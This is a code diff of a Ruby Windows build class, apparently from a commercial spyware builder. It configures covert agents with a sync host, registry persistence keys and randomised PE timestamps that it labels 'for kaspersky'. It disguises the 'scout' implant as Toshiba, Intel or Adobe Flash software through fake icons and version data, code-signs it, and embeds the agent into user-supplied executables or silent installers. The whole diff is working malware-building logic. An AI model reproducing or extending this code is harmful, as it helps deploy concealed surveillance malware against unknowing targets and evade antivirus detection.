@@ -35,33 +35,39 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
+    if File.exist? path('scout')
+      params[:core] = 'scout'
+      params[:config] = nil
+      # invoke the generic patch method with the new params
+      super
+      patch_file(:file => 'scout') do |content|
+        begin
+          host = @factory.configs.first.sync_host
+          raise "Sync host not found" unless host
+          content.binary_patch 'SYNC'*16, host.ljust(64, "\x00")
+        rescue
+          raise "Sync marker not found"
+        end
+      end
+    end
+
     # calculate the function name for the dropper
     @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
-    # patching for the function name
     patch_file(:file => 'core') do |content|
       begin
+        # patching for the function name
+        marker = "Funcname"
         content.binary_patch 'PFTBBP', @funcname
-      rescue
-        raise "Funcname marker not found"
-      end
-    end
 
-    # patching the build time (for kaspersky)
-    patch_file(:file => 'core') do |content|
-      begin
+        # patching the build time (for kaspersky)
+        marker = "Build time"
         offset = content.index("PE\x00\x00")
         raise "offset is nil" if offset.nil?
         content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
-      rescue Exception => e
-        raise "Build time ident marker not found: #{e.message}"
-      end
-    end
 
-    # patching for the registry key name
-    patch_file(:file => 'core') do |content|
-      begin
         # the new registry key
+        marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
         # and the old one (previous method)
         core = scramble_name(@factory.seed, 3)
@@ -69,43 +75,31 @@ class BuildWindows < Build
         reg = '*' + scramble_name(dir, 1)[1..-1]
         content.binary_patch 'IaspdPDuFMfnm_apggLLL712j', reg.ljust(25, "\x00")
       rescue
-        raise "Registry key marker not found"
+        raise "#{marker} marker not found"
       end
     end
 
-    # we have an exception here, the core64 must be patched only with the signature and function name
+    # we have an exception here, the core64 must be patched only with some values
 
-    # patching for the function name
     patch_file(:file => 'core64') do |content|
       begin
+        # patching for the function name
+        marker = "Funcname"
         content.binary_patch 'PFTBBP', @funcname
-      rescue
-        raise "Funcname marker not found"
-      end
-    end
 
-    # per-customer signature
-    patch_file(:file => 'core64') do |content|
-      begin
+        # per-customer signature
+        marker = "Signature"
         sign = ::Signature.where({scope: 'agent'}).first
         signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-
         marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
         magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
-
         content.binary_patch marker, signature
-      rescue
-        raise "Signature marker not found"
-      end
-    end
 
-    # patching for the registry key name
-    patch_file(:file => 'core64') do |content|
-      begin
         # the new registry key
+        marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
       rescue
-        raise "Registry key marker not found"
+        raise "#{marker} marker not found"
       end
     end
 
@@ -151,56 +145,32 @@ class BuildWindows < Build
     trace :debug, "Build: melting: #{params}"
 
     @appname = params['appname'] || 'agent'
-    @cooked = false
 
-    manifest = (params['admin'] == true) ? '1' : '0'
-
-    executable = path('default')
-
-    # by default build the 64bit support
+    # parse the parameters
+    @cooked = (params['cooked'] == true) ? true : false
+    @admin = (params['admin'] == true) ? true : false
     @bit64 = (params['bit64'] == false) ? false : true
     @codec = (params['codec'] == false) ? false : true
+    @scout = (params['scout'] == false) ? false : true
+    @melted = params['input'] ? true : false
 
-    # use the user-provided file to melt with
-    if params['input']
-      FileUtils.mv Config.instance.temp(params['input']), path('input')
-      executable = path('input')
+    # choose the correct melting mode
+    melting_mode = :silent
+    melting_mode = :cooked if @cooked
+    melting_mode = :melted if @melted
 
-      CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
-                                          (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
-                                          path(@scrambled[:config])+' '+
+    # change the icon of the exec accordingly to the name
+    customize_scout(@factory.confkey, params['icon']) if @scout
 
-                                          # TODO: driver removal
-                                          'null ' +
-                                          'null ' +
-                                          #path(@scrambled[:driver])+' '+
-                                          #(@bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
-
-                                          (@codec ? path(@scrambled[:codec]) : 'null') +' '+
-                                          @scrambled[:dir]+' '+
-                                          manifest +' '+
-                                          @funcname +' '+
-                                          (@demo ? path('demo_image') : 'null') +' '+
-                                          executable + ' ' +
-                                          path('output')
-    else
-      # we have to create a silent installer
-      cook(params)
-      File.exist? path('output') || raise("output file not created")
-
-      cooked = File.open(path('output'), 'rb') {|f| f.read}
-
-      silent_file = params['admin'] == true ? 'silent_admin' : 'silent'
-      File.open(path(silent_file), 'ab+') {|f| f.write cooked}
-
-      FileUtils.rm_rf path('output')
-      FileUtils.cp path(silent_file), path('output')
-    end
-
-    # this is a build for the NI
-    if params['cooked'] == true
-      @cooked = true
-      cook(params)
+    case melting_mode
+      when :silent
+        silent()
+      when :cooked
+        # this is a build for the NI
+        cook()
+      when :melted
+        # user-provided file to melt with
+        melted(Config.instance.temp(params['input']))
     end
 
     File.exist? path('output') || raise("output file not created")
@@ -214,7 +184,8 @@ class BuildWindows < Build
     trace :debug, "Build: signing: #{params}"
 
     # don't sign cooked file (its not a valid PE)
-    return if @cooked
+    # don't sign melted files (firefox signed by us is not credible)
+    return if @cooked or @melted
 
     # perform the signature
     #CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('output')}" if to_be_signed?(params)
@@ -237,11 +208,18 @@ class BuildWindows < Build
       core_content = z.file.open('core', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
+
+      core_content = z.file.open('scout', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
     end
 
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
     FileUtils.rm_rf Config.instance.temp('core')
+
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
+    FileUtils.rm_rf Config.instance.temp('scout')
   end
 
   def ghost(params)
@@ -273,42 +251,103 @@ class BuildWindows < Build
 
   private
 
-  def cook(params)
-    key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
+  def cook
+    if @scout
+      cook_param = '-S ' + path('scout') + ' -O ' + path('output')
+    else
+      key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
 
-    # write the ini file
-    File.open(path('RCS.ini'), 'w') do |f|
-      f.puts "[RCS]"
-      f.puts "HUID=#{@factory.ident}"
-      f.puts "HCORE=#{@scrambled[:core]}"
-      f.puts "HCONF=#{@scrambled[:config]}"
-      f.puts "CODEC=#{@scrambled[:codec]}" if @codec
-      f.puts "DLL64=#{@scrambled[:core64]}" if @bit64
+      # write the ini file
+      File.open(path('RCS.ini'), 'w') do |f|
+        f.puts "[RCS]"
+        f.puts "HUID=#{@factory.ident}"
+        f.puts "HCORE=#{@scrambled[:core]}"
+        f.puts "HCONF=#{@scrambled[:config]}"
+        f.puts "CODEC=#{@scrambled[:codec]}" if @codec
+        f.puts "DLL64=#{@scrambled[:core64]}" if @bit64
 
-      # TODO: driver removal (just comment them here)
-      #f.puts "HDRV=#{@scrambled[:driver]}"
-      #f.puts "DRIVER64=#{@scrambled[:driver64]}"
+        # TODO: driver removal (just comment them here)
+        #f.puts "HDRV=#{@scrambled[:driver]}"
+        #f.puts "DRIVER64=#{@scrambled[:driver64]}"
 
-      f.puts "HDIR=#{@scrambled[:dir]}"
-      f.puts "HREG=#{@scrambled[:reg]}"
-      f.puts "HSYS=ndisk.sys"
-      f.puts "HKEY=#{key}"
-      f.puts "MANIFEST=" + (params['admin'] == true ? 'yes' : 'no')
-      f.puts "FUNC=" + @funcname
-      f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
+        f.puts "HDIR=#{@scrambled[:dir]}"
+        f.puts "HREG=#{@scrambled[:reg]}"
+        f.puts "HSYS=ndisk.sys"
+        f.puts "HKEY=#{key}"
+        f.puts "MANIFEST=" + (@admin ? 'yes' : 'no')
+        f.puts "FUNC=" + @funcname
+        f.puts "INSTALLER=" + (@cooked ? 'no' : 'yes')
+      end
+      cook_param = '-C -R ' + path('') + ' -O ' + path('output')
+      cook_param += " -d #{path('demo_image')}" if @demo
     end
 
-    cook_param = '-C -R ' + path('') + ' -O ' + path('output')
-    cook_param += " -d #{path('demo_image')}" if @demo
-
     CrossPlatform.exec path('cooker'), cook_param
+
+    File.exist? path('output') || raise("cooker output file not created")
+  end
+
+  def silent
+    if @scout
+      # the scout is already created
+      FileUtils.cp path('scout'), path('output')
+    else
+      # we have to create a silent installer
+      cook()
+      cooked = File.open(path('output'), 'rb') {|f| f.read}
+
+      # we have a static var of 1 MiB
+      raise "cooked file is too big" if cooked.bytesize > 1024*1024
+
+      silent_file = @admin ? 'silent_admin' : 'silent'
+
+      patch_file(:file => silent_file) do |content|
+        begin
+          offset = content.index("\xef\xbe\xad\xde")
+          raise "offset is nil" if offset.nil?
+          content.binary_patch_at_offset offset, cooked
+        rescue Exception => e
+          raise "Room for cooked not found: #{e.message}"
+        end
+      end
+
+      # delete the cooked output file and overwrite it with the silent output
+      FileUtils.rm_rf path('output')
+      FileUtils.cp path(silent_file), path('output')
+    end
+  end
+
+  def melted(input)
+    FileUtils.mv input, path('input')
+
+    if @scout
+      CrossPlatform.exec path('dropper'), '-s ' + path('scout') + ' ' + path('input') + ' ' + path('output')
+    else
+      CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
+                                          (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
+                                          path(@scrambled[:config])+' '+
+
+                                          # TODO: driver removal
+                                          'null ' +
+                                          'null ' +
+                                          #path(@scrambled[:driver])+' '+
+                                          #(@bit64 ? path(@scrambled[:driver64]) : 'null') +' '+
+
+                                          (@codec ? path(@scrambled[:codec]) : 'null') +' '+
+                                          @scrambled[:dir]+' '+
+                                          (@admin ? '1' : '0') +' '+
+                                          @funcname +' '+
+                                          (@demo ? path('demo_image') : 'null') +' '+
+                                          path('input') + ' ' +
+                                          path('output')
+    end
   end
 
   def add_random(file)
     File.open(file, 'ab+') {|f| f.write SecureRandom.random_bytes(16)}
   end
 
-  def to_be_signed?(params)
+  def to_be_signed?(params = nil)
     # default case
     do_signature = false
 
@@ -323,6 +362,11 @@ class BuildWindows < Build
       do_signature = true
     end
 
+    # explicit request to NOT sign the code
+    if not params.nil? and params['sign'] == false
+      do_signature = true
+    end
+
     do_signature
   end
 
@@ -333,6 +377,45 @@ class BuildWindows < Build
                   'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
                   'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
     fake_names[seed.ord % fake_names.size] + " " + fakever
+  end
+
+  def scout_name(seed)
+    scout_names = [{name: 'btassist', version: '7.0.0.0', desc: 'Bluetooth Assistant', company: 'TOSHIBA CORPORATION', copyright: 'Copyright (C) 2009 TOSHIBA CORPORATION, All rights reserved.'},
+                   {name: 'IAStorIcon', version: '10.1.0.1008', desc: 'IAStorIcon', company: 'INTEL CORPORATION', copyright: 'Copyright (c) Intel Corporation 2009-2010'},
+                   {name: 'PrivacyIconClient', version: '7.1.20.1119', desc: 'Intel(R) Management and Security Status', company: 'INTEL CORPORATION', copyright: 'Copyright (c) 2007-2011 Intel Corporation'}]
+
+    scout_names[seed.ord % scout_names.size]
+  end
+
+  def customize_scout(seed, icon)
+
+    case icon
+      when 'flash'
+        icon_file = "icons/#{icon}.ico"
+        info = {name: 'FlashUtil', version: '11.5.500.104', desc: 'Adobe Flash Player Installer/Uninstaller 11.5 r500', company: 'Adobe Systems Incorporated', copyright: 'Copyright (c) 1996 Adobe Systems Incorporated'}
+      else
+        info = scout_name(seed)
+        icon_file = "icons/#{info[:name]}.ico"
+    end
+
+    # binary patch the name of the scout once copied in the startup
+    patch_file(:file => 'scout') do |content|
+      begin
+        # the filename of the final exec
+        content.binary_patch 'SCOUT'*4, info[:name].ljust(20, "\x00")
+      rescue
+        raise "Scout name marker not found"
+      end
+    end
+
+    # change the icon
+    CrossPlatform.exec path('rcedit'), "/I #{path('scout')} #{path(icon_file)}"
+
+    # change the infos
+    CrossPlatform.exec path('verpatch'), "/fn /va #{path('scout')} \"#{info[:version]}\" /s pb \"\" /s desc \"#{info[:desc]}\" /s company \"#{info[:company]}\" /s (c) \"#{info[:copyright]}\" /s product \"#{info[:desc]}\" /pv \"#{info[:version]}\""
+
+    # sign it
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('scout')}" if to_be_signed?
   end
 
 end
